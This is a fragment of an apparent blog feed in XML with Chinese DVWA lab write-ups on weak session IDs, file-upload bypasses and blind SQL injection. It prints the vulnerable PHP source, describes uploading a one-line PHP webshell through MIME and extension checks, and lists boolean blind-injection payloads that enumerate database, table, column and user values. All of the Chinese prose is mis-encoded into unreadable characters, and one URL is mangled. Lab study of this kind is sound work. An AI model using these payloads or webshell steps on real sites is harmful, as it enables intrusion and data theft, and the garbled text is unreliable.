    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>Weak Session IDsï¼š<br>å¯†ç ä¸è¯ä¹¦ç­‰è®¤è¯æ‰‹æ®µï¼Œä¸€èˆ¬ä»…ä»…ç”¨äºç™»å½•ï¼ˆLoginï¼‰çš„è¿‡ç¨‹ã€‚å½“ç™»é™†å®Œæˆåï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™çš„é¡µé¢ï¼Œä¸å¯èƒ½æ¯æ¬¡æµè§ˆå™¨è¯·æ±‚é¡µé¢æ—¶éƒ½å†ä½¿ç”¨å¯†ç è®¤è¯ä¸€æ¬¡ã€‚å› æ­¤ï¼Œå½“è®¤è¯å®Œæˆåã€‚å°±éœ€è¦æ›¿æ¢ä¸€ä¸ªå¯¹ç”¨æˆ·é€æ˜çš„å‡­è¯ã€‚è¿™ä¸ªå‡­è¯å°±æ˜¯SessionIDã€‚<br>å½“ç”¨æˆ·ç™»é™†å®Œæˆåï¼Œåœ¨æœåŠ¡å™¨ç«¯å°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ä¼šè¯ï¼ˆSessionï¼‰ï¼Œä¼šè¯ä¸­ä¼šä¿å­˜ç”¨æˆ·çš„çŠ¶æ€å’Œç›¸å…³ä¿¡æ¯ã€‚æœåŠ¡å™¨ç«¯ç»´æŠ¤æ‰€æœ‰åœ¨çº¿ç”¨æˆ·çš„Sessionï¼Œæ­¤æ—¶çš„è®¤è¯ï¼Œåªéœ€è¦çŸ¥é“æ˜¯å“ªä¸ªç”¨æˆ·åœ¨æµè§ˆå½“å‰çš„é¡µé¢å³å¯ã€‚ä¸ºäº†å‘Šè¯‰æœåŠ¡å™¨åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ªSessionï¼Œæµè§ˆå™¨éœ€è¦æŠŠå½“å‰ç”¨æˆ·æŒæœ‰çš„SessionIDå‘ŠçŸ¥æœåŠ¡å™¨ã€‚SessionIDä¸€æ—¦åœ¨ç”Ÿå‘½å‘¨æœŸå†…è¢«çªƒå–ï¼Œå°±ç­‰åŒäºè´¦æˆ·å¤±çªƒã€‚åŒæ—¶ç”±äºSessionIDæ˜¯ç”¨æˆ·ç™»å½•ä¹‹åæ‰æŒæœ‰çš„è®¤è¯å‡­è¯ï¼Œå› æ­¤é»‘å®¢ä¸éœ€è¦å†æ”»å‡»ç™»é™†è¿‡ç¨‹ï¼ˆæ¯”å¦‚å¯†ç ï¼‰ã€‚<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæ‘˜è‡ªä¸ºCSDNåšä¸»ã€Œbaynkã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/u014029795/article/details/102795784">https://blog.csdn.net/u014029795/article/details/102795784</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;Weak Session IDsï¼š&lt;br&gt;å¯†ç ä¸è¯ä¹¦ç­‰è®¤è¯æ‰‹æ®µï¼Œä¸€èˆ¬ä»…ä»…ç”¨äºç™»å½•ï¼ˆLoginï¼‰çš„è¿‡ç¨‹ã€‚å½“ç™»é™†å®Œæˆåï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™çš„é¡µ</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”File Uplod</title>
    <link href="http://example.com/2021/03/12/DVWA%E2%80%94File%20Uplod/"/>
    <id>http://example.com/2021/03/12/DVWA%E2%80%94File%20Uplod/</id>
    <published>2021-03-12T02:37:19.000Z</published>
    <updated>2021-03-12T11:38:03.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>ä¹‹å‰åˆ·è¿‡uploadå°±ä¸å¤šè¯´äº†</p><h1 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å†…å®¹æ²¡æœ‰åšä»»ä½•æ£€æŸ¥ã€è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ webshell.phpï¼Œè¿æ¥èšå‰‘ï¼Œå³å¯æ§åˆ¶æ•´ä¸ªæœåŠ¡å™¨ã€‚</p><p>![1](DVWAâ€”File Uplod/1.png)</p><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">&quot;image/jpeg&quot;</span> || $uploaded_type == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ã€å¤§å°åšäº†é™åˆ¶ï¼Œè¦æ±‚æ–‡ä»¶ç±»å‹å¿…é¡»æ˜¯jpegæˆ–è€…pngï¼Œå¤§å°ä¸èƒ½è¶…è¿‡100000Bï¼ˆçº¦ä¸º97.6KBï¼‰ã€‚</p><p><strong>æ³•ä¸€ï¼šæ­é…æ–‡ä»¶åŒ…å«æ¼æ´</strong></p><p>æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åä¸ºwebshell.pngï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´çš„ç‰¹æ€§ï¼Œå€ŸåŠ©Mediumçº§åˆ«çš„æ–‡ä»¶åŒ…å«æ¼æ´æ¥è·å–webshellæƒé™ã€‚ç”¨èšå‰‘è¿æ¥ï¼š<a href="http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.png%EF%BC%8C%E4%BD%86%E6%98%AF%E5%8F%91%E7%8E%B0%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%EF%BC%8C%E8%BF%94%E5%9B%9E%E5%86%85%E5%AE%B9%E4%B8%BA%E7%A9%BA%E3%80%82%E5%8E%9F%E6%9D%A5%EF%BC%8C%E8%9A%81%E5%89%91%E5%9C%A8%E8%BF%9E%E6%8E%A5%E6%97%B6%E5%B9%B6%E6%B2%A1%E6%9C%89%E6%90%BA%E5%B8%A6cookie%EF%BC%8C%E6%AD%A3%E5%9B%A0%E4%B8%BA%E7%BC%BA%E5%B0%91cookie%E5%80%BC%E6%89%8D%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E3%80%82">http://localhost:81/vulnerabilities/fi/?page=hthttp://tp://localhost:81/hackable/uploads/webshell.pngï¼Œä½†æ˜¯å‘ç°è¿æ¥å¤±è´¥ï¼Œè¿”å›å†…å®¹ä¸ºç©ºã€‚åŸæ¥ï¼Œèšå‰‘åœ¨è¿æ¥æ—¶å¹¶æ²¡æœ‰æºå¸¦cookieï¼Œæ­£å› ä¸ºç¼ºå°‘cookieå€¼æ‰æ— æ³•è¿æ¥æˆåŠŸã€‚</a></p><p>è§£å†³æ–¹æ³•å°±æ˜¯æ·»åŠ cookieï¼Œå…·ä½“è¯·çœ‹ï¼š<a href="https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh">https://blog.csdn.net/qq_39174983/article/details/111983259?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161426249816780261924019%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161426249816780261924019&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111983259.pc_search_result_no_baidu_js&amp;utm_term=DVWA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EHigh</a></p><p><strong>æ³•äºŒï¼šæŠ“åŒ…ä¿®æ”¹</strong></p><p>æˆ‘ä»¬å…ˆä¸Šä¼ webshell.pngï¼Œå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶ååç¼€ä¸ºphp</p><p>![2](DVWAâ€”File Uplod/2.png)</p><p>èšå‰‘è¿æ¥å³å¯</p><p>![1](DVWAâ€”File Uplod/1.png)</p><h1 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&quot;jpg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( $uploaded_ext ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è¿™æ¬¡æ£€æŸ¥äº†æ–‡ä»¶ååç¼€ï¼Œè®¾ç½®äº†ç™½åå•ï¼Œå¹¶ä¸”getimagesizeå‡½æ•°æ£€æŸ¥äº†æ–‡ä»¶å¤´å†…å®¹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å›¾ç‰‡é©¬æ­é…æ–‡ä»¶åŒ…å«æ¼æ´å®Œæˆç»•è¿‡ã€‚å…·ä½“æ­¥éª¤å’ŒMediumçº§åˆ«çš„ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ æ²¡æœ‰ä»€ä¹ˆå·®åˆ«ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;ä¹‹å‰åˆ·è¿‡uploadå°±ä¸å¤šè¯´äº†&lt;/p&gt;
&lt;h1 id=&quot;Lowï¼š&quot;&gt;&lt;a href=&quot;#Lowï¼š&quot; class=&quot;headerlin</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWAâ€”SQL Injection (Blind)</title>
    <link href="http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/"/>
    <id>http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/</id>
    <published>2021-03-10T08:48:00.000Z</published>
    <updated>2021-03-12T11:38:15.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>SQLç›²æ³¨ä¸ä¸€èˆ¬SQLæ³¨å…¥çš„åŒºåˆ«åœ¨äºä¸€èˆ¬SQLæ³¨å…¥çš„æ”»å‡»è€…å¯ä»¥ç›´æ¥ä»é¡µé¢ä¸Šçœ‹åˆ°æ³¨å…¥è¯­å¥çš„æ‰§è¡Œç»“æœï¼Œè€Œç›²æ³¨æ—¶æ”»å‡»è€…é€šå¸¸æ˜¯æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–æ‰§è¡Œçš„ç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— æ³•å¾—çŸ¥ã€‚</p><h1 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h1><p><strong>1ï¼‰åˆ¤æ–­æ³¨å…¥ç‚¹å³å…¶ç±»å‹</strong></p><p>1â€™ and â€˜1â€™=â€™1![2](DVWAâ€”SQL Injection (Blind)/2.png)</p><p>1â€™ and â€˜1â€™=â€™2![1](DVWAâ€”SQL Injection (Blind)/1.png)</p><p>å¯çŸ¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œä¸”æ³¨å…¥ç±»å‹ä¸º<code>&#39;</code></p><p><strong>2ï¼‰çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥çš„å­—æ®µæ•°</strong></p><p>1â€™ order by 2#![2](DVWAâ€”SQL Injection (Blind)/2.png)</p><p>1â€™ order by 3#![1](DVWAâ€”SQL Injection (Blind)/1.png)</p><p><strong>3ï¼‰çˆ†åº“</strong></p><p>1â€™ and length(database())=1 # ï¼Œä¸å­˜åœ¨</p><p>1â€™ and length(database())=2 # ï¼Œä¸å­˜åœ¨</p><p>1â€™ and length(database())=3 # ï¼Œä¸å­˜åœ¨</p><p>1â€™ and length(database())=4 # ï¼Œå­˜åœ¨ï¼Œå› æ­¤åº“åé•¿åº¦ä¸ºå››</p><p>1â€™ and left(database(),1)=â€™dâ€™#ï¼Œå­˜åœ¨ï¼Œä¸€æ¬¡åº“åçš„é¦–å­—æ¯ä¸º<code>d</code>ï¼Œå‰©ä¸‹çš„ä¸€æ¬¡ç±»æ¨ï¼Œå¾—åº“åä¸ºdvwa</p><p><strong>4ï¼‰çˆ†è¡¨</strong></p><ul><li><p>å…ˆçŒœè¡¨ä¸ªæ•°</p><p>1â€™ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #ï¼Œå­˜åœ¨ï¼Œå³æœ‰ä¸¤ä¸ªè¡¨</p></li><li><p>çŒœè¡¨åé•¿åº¦</p><p>1â€™ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #ï¼Œå­˜åœ¨ï¼Œç¬¬ä¸€ä¸ªè¡¨åæœ‰9ä¸ªå­—æ¯</p><p>1â€™ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #</p><p>å­˜åœ¨ï¼Œç¬¬äºŒä¸ªè¡¨åæœ‰5ä¸ªå­—æ¯</p></li><li><p>çŒœè¡¨åç»„æˆå­—ç¬¦</p><p>1â€™ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=â€™uâ€™ #ï¼Œå­˜åœ¨ï¼Œè¯´æ˜ç¬¬äºŒä¸ªè¡¨çš„è¡¨åé¦–å­—æ¯ä¸º<code>u</code>ï¼Œä»¥æ­¤ç±»æ¨å¯å¾—ç¬¬äºŒä¸ªè¡¨è¡¨åä¸º<code>users</code></p></li></ul><p><strong>5ï¼‰çˆ†åˆ—</strong></p><p>çˆ†åˆ—å’Œçˆ†è¡¨åŸºæœ¬ç›¸ä¼¼ï¼Œä»…éœ€ç¨å¾®ä¿®æ”¹ä¸€ç‚¹å³å¯ï¼Œä¸‹é¢å°±ä¸¾çŒœè¡¨ä¸ªæ•°ä¸ºä¾‹ï¼Œå…¶ä½™è‡ªè¡Œå˜é€šã€‚</p><p>1â€™ and (select count(column_name) from information_schema.columns where table_name=â€™usersâ€™)=14 #ï¼Œå­˜åœ¨ï¼Œè¯´æ˜æœ‰14ä¸ªåˆ—</p><p><strong>6ï¼‰çˆ†å€¼</strong></p><p>çˆ†å€¼æ‰‹åŠ¨æ“ä½œé‡å¤ªå¤§äº†ï¼Œè¿™é‡Œå°±ä»¥çˆ†åˆ—ï¼šuserä¸ºä¾‹</p><p>1â€™ and substr((select user from users limit 0,1),1,1)=â€™aâ€™#</p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span 